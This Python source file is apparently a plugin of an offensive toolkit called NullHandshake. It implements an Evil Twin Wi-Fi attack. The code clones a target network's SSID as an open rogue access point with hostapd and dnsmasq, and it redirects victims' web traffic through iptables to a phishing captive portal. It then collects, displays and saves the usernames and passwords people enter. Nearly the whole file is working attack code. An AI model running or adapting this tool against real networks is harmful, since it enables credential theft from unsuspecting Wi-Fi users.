#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NullHandshake - Evil Twin Plugin

This plugin implements Evil Twin attack functionality to create rogue
access points for capturing credentials.
"""

import os
import time
import threading
import subprocess
import socket
import signal
import shutil
import ipaddress
from typing import Dict, List, Any, Optional, Tuple

import netifaces
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.panel import Panel

from core.plugin_manager import PluginInterface
from core.utils import (
    run_command, is_root, get_interfaces, is_wireless_interface,
    random_mac, get_local_ip
)

class EvilTwin(PluginInterface):
    """Evil Twin plugin for creating rogue access points and capturing credentials."""
    
    def __init__(self, framework):
        """
        Initialize the Evil Twin plugin.
        
        Args:
            framework: The NullHandshake framework instance
        """
        super().__init__(framework)
        self.name = "evil_twin"
        self.description = "Deploy Evil Twin access points and capture credentials"
        
        # Configuration
        self.interface = None
        self.target_ap = None
        self.target_ssid = None
        self.target_bssid = None
        self.target_channel = None
        self.rogue_interface = None
        self.hostapd_conf = None
        self.dnsmasq_conf = None
        self.captive_portal_enabled = False
        self.captive_portal_proc = None
        
        # Evil Twin status
        self.running = False
        self.captured_credentials = []
        
        # Process handling
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.original_forwarding_state = None
        
        # Paths
        self.base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.temp_dir = os.path.join(self.base_dir, 'data', 'evil_twin')
        os.makedirs(self.temp_dir, exist_ok=True)
        
        self.logger.info("Evil Twin plugin initialized")
    
    def list_interfaces(self) -> List[str]:
        """
        List available wireless interfaces.
        
        Returns:
            List[str]: List of wireless interface names
        """
        interfaces = get_interfaces()
        wireless_interfaces = [iface for iface in interfaces if is_wireless_interface(iface)]
        
        if not wireless_interfaces:
            self.console.print("[yellow]No wireless interfaces found[/yellow]")
        else:
            table = Table(title="Wireless Interfaces")
            table.add_column("Interface", style="cyan")
            table.add_column("Wireless", style="green")
            
            for iface in interfaces:
                is_wireless = is_wireless_interface(iface)
                status = "[green]Yes[/green]" if is_wireless else "[red]No[/red]"
                if is_wireless:
                    table.add_row(iface, status)
            
            self.console.print(table)
        
        return wireless_interfaces
    
    def set_interface(self, interface: str) -> bool:
        """
        Set the wireless interface to use for the Evil Twin.
        
        Args:
            interface (str): Name of the wireless interface
            
        Returns:
            bool: True if interface was set successfully, False otherwise
        """
        if not is_wireless_interface(interface):
            self.console.print(f"[red]Error: {interface} is not a wireless interface[/red]")
            return False
        
        self.interface = interface
        self.console.print(f"[green]Interface set to: {interface}[/green]")
        return True
    
    def set_target(self, ssid: str, bssid: str = None, channel: int = None) -> bool:
        """
        Set the target access point details.
        
        Args:
            ssid (str): SSID of the target access point
            bssid (str, optional): BSSID of the target access point
            channel (int, optional): Channel of the target access point
            
        Returns:
            bool: True if target was set successfully, False otherwise
        """
        self.target_ssid = ssid
        self.target_bssid = bssid
        self.target_channel = channel
        
        self.console.print(f"[green]Target access point set:[/green]")
        self.console.print(f"  SSID: {ssid}")
        if bssid:
            self.console.print(f"  BSSID: {bssid}")
        if channel:
            self.console.print(f"  Channel: {channel}")
        
        return True
    
    def setup_ap(self, enable_captive_portal: bool = True) -> bool:
        """
        Setup the Evil Twin access point.
        
        Args:
            enable_captive_portal (bool): Whether to enable captive portal
            
        Returns:
            bool: True if setup was successful, False otherwise
        """
        if not self.interface:
            self.console.print("[red]Error: No interface selected. Use set_interface first.[/red]")
            return False
        
        if not self.target_ssid:
            self.console.print("[red]Error: No target set. Use set_target first.[/red]")
            return False
        
        if not is_root():
            self.console.print("[red]Error: Root privileges required to setup access point[/red]")
            return False
        
        # Check for required dependencies
        if not self._check_dependencies():
            return False
        
        # Use the same interface for the rogue AP
        self.rogue_interface = self.interface
        
        # Create hostapd configuration
        if not self._create_hostapd_config():
            return False
        
        # Create dnsmasq configuration
        if not self._create_dnsmasq_config():
            return False
        
        # Configure IP forwarding and iptables
        if not self._configure_network():
            return False
        
        # Set up captive portal if requested
        self.captive_portal_enabled = enable_captive_portal
        if enable_captive_portal:
            self.console.print("[green]Captive portal will be enabled[/green]")
        
        self.console.print("[green]Evil Twin access point configured successfully[/green]")
        return True
    
    def _check_dependencies(self) -> bool:
        """
        Check if required dependencies are installed.
        
        Returns:
            bool: True if all dependencies are available, False otherwise
        """
        dependencies = ['hostapd', 'dnsmasq']
        missing = []
        
        for dep in dependencies:
            if shutil.which(dep) is None:
                missing.append(dep)
        
        if missing:
            self.console.print(f"[red]Error: Missing dependencies: {', '.join(missing)}[/red]")
            self.console.print("[yellow]Install them with: apt-get install " + " ".join(missing))
            return False
        
        return True
    
    def _create_hostapd_config(self) -> bool:
        """
        Create the hostapd configuration file.
        
        Returns:
            bool: True if configuration was created successfully, False otherwise
        """
        try:
            config_path = os.path.join(self.temp_dir, 'hostapd.conf')
            
            with open(config_path, 'w') as f:
                f.write(f"interface={self.rogue_interface}\n")
                f.write(f"ssid={self.target_ssid}\n")
                f.write(f"hw_mode=g\n")
                
                # Use target channel if specified, otherwise use channel 1
                channel = self.target_channel if self.target_channel else 1
                f.write(f"channel={channel}\n")
                
                # General configuration
                f.write("driver=nl80211\n")
                f.write("macaddr_acl=0\n")
                f.write("ignore_broadcast_ssid=0\n")
                
                # Authentication settings (open network)
                f.write("auth_algs=1\n")
                f.write("wpa=0\n")  # No WPA encryption for easy connection
            
            self.hostapd_conf = config_path
            self.logger.info(f"Created hostapd configuration at {config_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error creating hostapd configuration: {str(e)}")
            self.console.print(f"[red]Error creating hostapd configuration: {str(e)}[/red]")
            return False
    
    def _create_dnsmasq_config(self) -> bool:
        """
        Create the dnsmasq configuration file.
        
        Returns:
            bool: True if configuration was created successfully, False otherwise
        """
        try:
            config_path = os.path.join(self.temp_dir, 'dnsmasq.conf')
            
            # Get Evil Twin network configuration from framework config
            gateway_ip = self.framework.config.get('evil_twin', 'gateway_ip', '10.0.0.1')
            subnet_mask = self.framework.config.get('evil_twin', 'subnet_mask', '255.255.255.0')
            dhcp_range = self.framework.config.get('evil_twin', 'dhcp_range', '10.0.0.10,10.0.0.50,12h')
            
            with open(config_path, 'w') as f:
                f.write(f"interface={self.rogue_interface}\n")
                f.write(f"dhcp-range={dhcp_range}\n")
                f.write(f"dhcp-option=3,{gateway_ip}\n")  # Set default gateway
                f.write(f"dhcp-option=6,{gateway_ip}\n")  # Set DNS server
                f.write("server=8.8.8.8\n")  # Upstream DNS server
                f.write("log-queries\n")
                f.write("log-dhcp\n")
                
                if self.captive_portal_enabled:
                    # Redirect all DNS queries to our IP
                    f.write("address=/#/{gateway_ip}\n")
            
            self.dnsmasq_conf = config_path
            self.logger.info(f"Created dnsmasq configuration at {config_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error creating dnsmasq configuration: {str(e)}")
            self.console.print(f"[red]Error creating dnsmasq configuration: {str(e)}[/red]")
            return False
    
    def _configure_network(self) -> bool:
        """
        Configure network settings for the Evil Twin.
        
        Returns:
            bool: True if configuration was successful, False otherwise
        """
        try:
            # Get Evil Twin network configuration
            gateway_ip = self.framework.config.get('evil_twin', 'gateway_ip', '10.0.0.1')
            subnet_mask = self.framework.config.get('evil_twin', 'subnet_mask', '255.255.255.0')
            
            # Save original IP forwarding state
            with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
                self.original_forwarding_state = f.read().strip()
            
            # Enable IP forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            
            # Configure interface IP
            run_command(['ifconfig', self.rogue_interface, 'down'])
            run_command(['ifconfig', self.rogue_interface, gateway_ip, 'netmask', subnet_mask])
            run_command(['ifconfig', self.rogue_interface, 'up'])
            
            # Allow IP masquerading (NAT)
            run_command(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'])
            
            # Allow established connections
            run_command(['iptables', '-A', 'FORWARD', '-i', self.rogue_interface, '-o', 'eth0', '-j', 'ACCEPT'])
            run_command(['iptables', '-A', 'FORWARD', '-i', 'eth0', '-o', self.rogue_interface, '-m', 'state', '--state', 'RELATED,ESTABLISHED', '-j', 'ACCEPT'])
            
            if self.captive_portal_enabled:
                # Redirect HTTP traffic to our captive portal
                portal_port = self.framework.config.get('evil_twin', 'phishing_port', 5000)
                run_command([
                    'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', self.rogue_interface,
                    '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', str(portal_port)
                ])
                
                # Redirect HTTPS traffic (won't work for HTTPS but captures the attempt)
                run_command([
                    'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', self.rogue_interface,
                    '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', str(portal_port)
                ])
            
            self.logger.info("Network configured for Evil Twin")
            return True
            
        except Exception as e:
            self.logger.error(f"Error configuring network: {str(e)}")
            self.console.print(f"[red]Error configuring network: {str(e)}[/red]")
            return False
    
    def start_ap(self) -> bool:
        """
        Start the Evil Twin access point.
        
        Returns:
            bool: True if the AP was started successfully, False otherwise
        """
        if not self.hostapd_conf or not self.dnsmasq_conf:
            self.console.print("[red]Error: Evil Twin not set up. Use setup_ap first.[/red]")
            return False
        
        if self.running:
            self.console.print("[yellow]Evil Twin is already running[/yellow]")
            return True
        
        if not is_root():
            self.console.print("[red]Error: Root privileges required to start access point[/red]")
            return False
        
        try:
            # Start hostapd
            self.logger.info(f"Starting hostapd with config {self.hostapd_conf}")
            self.hostapd_proc = subprocess.Popen(
                ['hostapd', self.hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Wait a bit for hostapd to initialize
            time.sleep(2)
            
            if self.hostapd_proc.poll() is not None:
                # Process exited
                stdout, stderr = self.hostapd_proc.communicate()
                self.logger.error(f"hostapd failed to start: {stderr}")
                self.console.print(f"[red]Error starting hostapd: {stderr}[/red]")
                return False
            
            # Start dnsmasq
            self.logger.info(f"Starting dnsmasq with config {self.dnsmasq_conf}")
            self.dnsmasq_proc = subprocess.Popen(
                ['dnsmasq', '-C', self.dnsmasq_conf, '-d'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Wait a bit for dnsmasq to initialize
            time.sleep(1)
            
            if self.dnsmasq_proc.poll() is not None:
                # Process exited
                stdout, stderr = self.dnsmasq_proc.communicate()
                self.logger.error(f"dnsmasq failed to start: {stderr}")
                self.console.print(f"[red]Error starting dnsmasq: {stderr}[/red]")
                
                # Kill hostapd
                if self.hostapd_proc:
                    self.hostapd_proc.terminate()
                    self.hostapd_proc = None
                
                return False
            
            # Start captive portal if enabled
            if self.captive_portal_enabled:
                self._start_captive_portal()
            
            self.running = True
            self.console.print("[green]Evil Twin access point started successfully[/green]")
            
            # Get gateway IP from config
            gateway_ip = self.framework.config.get('evil_twin', 'gateway_ip', '10.0.0.1')
            self.console.print(f"[green]AP is running with IP: {gateway_ip}[/green]")
            
            if self.captive_portal_enabled:
                portal_port = self.framework.config.get('evil_twin', 'phishing_port', 5000)
                self.console.print(f"[green]Captive portal running at: http://{gateway_ip}:{portal_port}[/green]")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error starting Evil Twin: {str(e)}")
            self.console.print(f"[red]Error starting Evil Twin: {str(e)}[/red]")
            
            # Cleanup
            self._cleanup_processes()
            return False
    
    def _start_captive_portal(self) -> None:
        """Start the captive portal web server."""
        try:
            from plugins.phishing.app import run_portal
            
            portal_port = self.framework.config.get('evil_twin', 'phishing_port', 5000)
            gateway_ip = self.framework.config.get('evil_twin', 'gateway_ip', '10.0.0.1')
            
            # Create environment for the captive portal
            env = os.environ.copy()
            env['PORTAL_SSID'] = self.target_ssid
            env['PORTAL_LOGO'] = 'wifi'  # Default logo
            
            # Start the portal in a separate process
            self.logger.info(f"Starting captive portal on port {portal_port}")
            self.captive_portal_proc = subprocess.Popen(
                ['python', '-c', f"from plugins.phishing.app import run_portal; run_portal('{gateway_ip}', {portal_port}, '{self.target_ssid}')"],
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(1)
            if self.captive_portal_proc.poll() is not None:
                # Process exited
                stdout, stderr = self.captive_portal_proc.communicate()
                self.logger.error(f"Captive portal failed to start: {stderr.decode()}")
                self.console.print(f"[red]Error starting captive portal: {stderr.decode()}[/red]")
            else:
                self.logger.info("Captive portal started successfully")
            
        except Exception as e:
            self.logger.error(f"Error starting captive portal: {str(e)}")
            self.console.print(f"[red]Error starting captive portal: {str(e)}[/red]")
    
    def stop_ap(self) -> bool:
        """
        Stop the Evil Twin access point.
        
        Returns:
            bool: True if the AP was stopped successfully, False otherwise
        """
        if not self.running:
            self.console.print("[yellow]Evil Twin is not running[/yellow]")
            return True
        
        if not is_root():
            self.console.print("[red]Error: Root privileges required to stop access point[/red]")
            return False
        
        try:
            # Stop all processes
            self._cleanup_processes()
            
            # Restore network configuration
            self._restore_network()
            
            self.running = False
            self.console.print("[green]Evil Twin access point stopped successfully[/green]")
            return True
            
        except Exception as e:
            self.logger.error(f"Error stopping Evil Twin: {str(e)}")
            self.console.print(f"[red]Error stopping Evil Twin: {str(e)}[/red]")
            return False
    
    def _cleanup_processes(self) -> None:
        """Clean up all running processes."""
        # Stop captive portal
        if self.captive_portal_proc:
            self.logger.info("Stopping captive portal")
            self.captive_portal_proc.terminate()
            try:
                self.captive_portal_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.captive_portal_proc.kill()
            self.captive_portal_proc = None
        
        # Stop dnsmasq
        if self.dnsmasq_proc:
            self.logger.info("Stopping dnsmasq")
            self.dnsmasq_proc.terminate()
            try:
                self.dnsmasq_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.dnsmasq_proc.kill()
            self.dnsmasq_proc = None
        
        # Stop hostapd
        if self.hostapd_proc:
            self.logger.info("Stopping hostapd")
            self.hostapd_proc.terminate()
            try:
                self.hostapd_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.hostapd_proc.kill()
            self.hostapd_proc = None
        
        # Kill processes by name as backup
        self.logger.info("Ensuring all processes are stopped")
        run_command(['pkill', '-f', 'hostapd'])
        run_command(['pkill', '-f', 'dnsmasq'])
    
    def _restore_network(self) -> None:
        """Restore original network configuration."""
        try:
            # Restore IP forwarding state
            if self.original_forwarding_state is not None:
                self.logger.info(f"Restoring IP forwarding to {self.original_forwarding_state}")
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write(self.original_forwarding_state)
                self.original_forwarding_state = None
            
            # Remove iptables rules
            run_command(['iptables', '-F'])
            run_command(['iptables', '-t', 'nat', '-F'])
            
            # Restore interface
            run_command(['ifconfig', self.rogue_interface, 'down'])
            run_command(['ifconfig', self.rogue_interface, 'up'])
            
            self.logger.info("Network configuration restored")
            
        except Exception as e:
            self.logger.error(f"Error restoring network configuration: {str(e)}")
    
    def check_status(self) -> None:
        """Check and display the status of the Evil Twin access point."""
        if not self.running:
            self.console.print("[yellow]Evil Twin is not running[/yellow]")
            return
        
        try:
            # Check if processes are still running
            hostapd_running = self.hostapd_proc and self.hostapd_proc.poll() is None
            dnsmasq_running = self.dnsmasq_proc and self.dnsmasq_proc.poll() is None
            portal_running = self.captive_portal_proc and self.captive_portal_proc.poll() is None
            
            # Create status table
            table = Table(title="Evil Twin Status")
            table.add_column("Component", style="cyan")
            table.add_column("Status", style="green")
            
            table.add_row("hostapd", "[green]Running[/green]" if hostapd_running else "[red]Stopped[/red]")
            table.add_row("dnsmasq", "[green]Running[/green]" if dnsmasq_running else "[red]Stopped[/red]")
            
            if self.captive_portal_enabled:
                table.add_row("Captive Portal", "[green]Running[/green]" if portal_running else "[red]Stopped[/red]")
            
            # Get network info
            gateway_ip = self.framework.config.get('evil_twin', 'gateway_ip', '10.0.0.1')
            
            # Display AP info
            self.console.print(table)
            self.console.print(f"[green]AP Information:[/green]")
            self.console.print(f"  SSID: {self.target_ssid}")
            self.console.print(f"  Interface: {self.rogue_interface}")
            self.console.print(f"  IP Address: {gateway_ip}")
            
            if self.captive_portal_enabled:
                portal_port = self.framework.config.get('evil_twin', 'phishing_port', 5000)
                self.console.print(f"  Captive Portal URL: http://{gateway_ip}:{portal_port}")
            
            # Show captured credentials
            if self.captured_credentials:
                cred_table = Table(title="Captured Credentials")
                cred_table.add_column("Username/Email", style="cyan")
                cred_table.add_column("Password", style="red")
                cred_table.add_column("Timestamp", style="dim")
                
                for cred in self.captured_credentials:
                    cred_table.add_row(
                        cred.get('username', 'N/A'),
                        cred.get('password', 'N/A'),
                        cred.get('timestamp', 'N/A')
                    )
                
                self.console.print(cred_table)
            
        except Exception as e:
            self.logger.error(f"Error checking status: {str(e)}")
            self.console.print(f"[red]Error checking status: {str(e)}[/red]")
    
    def get_captured_credentials(self) -> List[Dict[str, str]]:
        """
        Get the list of captured credentials from the captive portal.
        
        Returns:
            List[Dict[str, str]]: List of credential dictionaries
        """
        # Check the credentials file from the captive portal
        creds_path = os.path.join(self.temp_dir, 'credentials.txt')
        
        self.captured_credentials = []
        
        if os.path.exists(creds_path):
            try:
                with open(creds_path, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        
                        parts = line.split(',')
                        if len(parts) >= 2:
                            timestamp = parts[2] if len(parts) > 2 else time.strftime('%Y-%m-%d %H:%M:%S')
                            self.captured_credentials.append({
                                'username': parts[0],
                                'password': parts[1],
                                'timestamp': timestamp
                            })
            except Exception as e:
                self.logger.error(f"Error reading credentials file: {str(e)}")
        
        return self.captured_credentials
    
    def show_captured_credentials(self) -> None:
        """Display captured credentials."""
        creds = self.get_captured_credentials()
        
        if not creds:
            self.console.print("[yellow]No credentials captured yet[/yellow]")
            return
        
        # Display credentials
        cred_table = Table(title="Captured Credentials")
        cred_table.add_column("#", style="dim", width=4)
        cred_table.add_column("Username/Email", style="cyan")
        cred_table.add_column("Password", style="red")
        cred_table.add_column("Timestamp", style="dim")
        
        for idx, cred in enumerate(creds, 1):
            cred_table.add_row(
                str(idx),
                cred.get('username', 'N/A'),
                cred.get('password', 'N/A'),
                cred.get('timestamp', 'N/A')
            )
        
        self.console.print(cred_table)
    
    def save_captured_credentials(self, filename: str = None) -> bool:
        """
        Save captured credentials to a file.
        
        Args:
            filename (str, optional): Output filename
            
        Returns:
            bool: True if credentials were saved successfully, False otherwise
        """
        creds = self.get_captured_credentials()
        
        if not creds:
            self.console.print("[yellow]No credentials to save[/yellow]")
            return False
        
        if not filename:
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            filename = f"evil_twin_credentials_{timestamp}.txt"
        
        # Create data directory if it doesn't exist
        data_dir = os.path.join(self.base_dir, 'data')
        os.makedirs(data_dir, exist_ok=True)
        
        # Full path to output file
        output_file = os.path.join(data_dir, filename)
        
        try:
            with open(output_file, 'w') as f:
                f.write("===== Evil Twin Captured Credentials =====\n\n")
                f.write(f"Target SSID: {self.target_ssid}\n")
                f.write(f"Capture Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                for cred in creds:
                    f.write(f"Username: {cred.get('username', 'N/A')}\n")
                    f.write(f"Password: {cred.get('password', 'N/A')}\n")
                    f.write(f"Timestamp: {cred.get('timestamp', 'N/A')}\n")
                    f.write("-" * 40 + "\n")
            
            self.console.print(f"[green]Credentials saved to: {output_file}[/green]")
            return True
            
        except Exception as e:
            self.logger.error(f"Error saving credentials: {str(e)}")
            self.console.print(f"[red]Error saving credentials: {str(e)}[/red]")
            return False
    
    def cleanup(self) -> None:
        """
        Clean up resources before unloading the plugin.
        """
        # Stop access point if running
        if self.running:
            self.stop_ap()
        
        # Remove temporary files
        for filename in ['hostapd.conf', 'dnsmasq.conf']:
            path = os.path.join(self.temp_dir, filename)
            if os.path.exists(path):
                try:
                    os.remove(path)
                except:
                    pass
        
        self.logger.info("Evil Twin plugin cleaned up")

